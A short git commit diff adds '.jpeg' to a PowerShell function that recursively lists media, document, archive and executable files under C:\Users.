6c7ffc308375816285cd40ec8a7992e34f7cdc0a
SoCuul <63339559+SoCuul@users.noreply.github.com>
2023-10-31 13:59:18 -0700

    Search for jpeg files

--- modules/5-SearchForFiles.psm1
+++ modules/5-SearchForFiles.psm1
@@ -1,5 +1,5 @@
 function Search-ForFiles {
-    $Extensions = "*.jpg", "*.png", "*.tiff", "*.bmp", "*.gif", "*.mp3", "*.wav", "*.ogg", "*.flac", "*.mp4", "*.mov", "*.mkv", "*.txt", "*.docx", "*.doc", "*.xlsx", "*.csv", "*.pptx", "*.psd", "*.pdf", "*.zip", "*.rar", "*.7z", "*.exe", "*.scr", "*.com", "*.msi"
+    $Extensions = "*.jpg", "*.jpeg", "*.png", "*.tiff", "*.bmp", "*.gif", "*.mp3", "*.wav", "*.ogg", "*.flac", "*.mp4", "*.mov", "*.mkv", "*.txt", "*.docx", "*.doc", "*.xlsx", "*.csv", "*.pptx", "*.psd", "*.pdf", "*.zip", "*.rar", "*.7z", "*.exe", "*.scr", "*.com", "*.msi"
     $SearchPath = "C:\Users"
 
     Get-ChildItem -Path $SearchPath -Include $Extensions -Recurse -ErrorAction SilentlyContinue -Force
